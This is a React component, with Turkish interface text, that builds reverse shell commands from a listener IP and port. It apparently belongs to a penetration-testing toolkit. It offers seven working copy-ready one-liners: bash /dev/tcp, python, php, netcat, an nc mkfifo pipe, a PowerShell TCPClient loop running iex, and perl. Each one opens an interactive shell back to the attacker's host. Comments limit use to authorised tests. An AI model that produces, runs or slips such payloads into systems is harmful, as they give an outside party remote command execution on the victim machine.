import { useState } from 'react';
import { copyText } from './copy';

// Reverse shell ureteci — IP + port -> 6 dilde hazir one-liner.
// Saldiri ARACI DEGIL, uretec: ciktiyi YETKILI testlerinde kullan.
const shells = (ip: string, port: string): [string, string][] => [
  ['bash', `bash -i >& /dev/tcp/${ip}/${port} 0>&1`],
  ['python', `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`],
  ['php', `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`],
  ['netcat', `nc -e /bin/sh ${ip} ${port}`],
  ['nc mkfifo', `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`],
  ['powershell', `$c=New-Object Net.Sockets.TCPClient("${ip}",${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}`],
  ['perl', `perl -MIO -e '$s=new IO::Socket::INET(PeerAddr=>"${ip}:${port}");STDIN->fdopen($s,r);$~->fdopen($s,w);system$_ while<>;'`],
];

export default function ReverseShell() {
  const [ip, setIp] = useState('10.10.10.10');
  const [port, setPort] = useState('4444');
  const [copied, setCopied] = useState<string | null>(null);
  const ok = /^\d{1,3}(\.\d{1,3}){3}$/.test(ip.trim()) && /^\d{1,5}$/.test(port.trim());
  const copy = async (v: string) => {
    if (await copyText(v)) { setCopied(v); setTimeout(() => setCopied(null), 1000); }
  };

  return (
    <div className="rounded-2xl border border-[#1E1E1E] bg-[#0A0A0A] p-5">
      <h3 className="text-[14px] font-bold text-white">Reverse Shell Üreteci</h3>
      <p className="mt-1 text-[12px] text-[#888]">Dinleyici IP + port yaz, 7 dilde hazır satır al. Sadece yetkili testlerde.</p>
      <div className="mt-3 flex gap-2">
        <input value={ip} onChange={(e) => setIp(e.target.value)} aria-label="Dinleyici IP" placeholder="10.10.10.10"
          className="flex-1 rounded-lg border border-[#2A2A2A] bg-[#1A1A1A] px-3 py-2 font-mono text-[13px] text-white outline-none focus:border-[#FF9F0A]" />
        <input value={port} onChange={(e) => setPort(e.target.value)} inputMode="numeric" aria-label="Dinleyici port" placeholder="4444"
          className="w-24 rounded-lg border border-[#2A2A2A] bg-[#1A1A1A] px-3 py-2 font-mono text-[13px] text-white outline-none focus:border-[#FF9F0A]" />
      </div>
      {ok ? (
        <div className="mt-3 space-y-1.5">
          {shells(ip.trim(), port.trim()).map(([label, v]) => (
            <div key={label} className="flex items-center gap-2">
              <span className="w-20 shrink-0 font-mono text-[11px] text-[#666]">{label}</span>
              <button onClick={() => copy(v)} title="Kopyalamak icin tikla" data-testid={`revshell-${label}`}
                className="min-w-0 flex-1 truncate rounded-lg bg-[#141414] px-3 py-1.5 text-left font-mono text-[12px] text-[#DDD] hover:text-white">
                {copied === v ? <span className="text-[#30D158]">kopyalandı ✓</span> : v}
              </button>
            </div>
          ))}
        </div>
      ) : (
        <p className="mt-3 text-[12px] text-[#E30613]">Geçerli IPv4 + port gir</p>
      )}
    </div>
  );
}
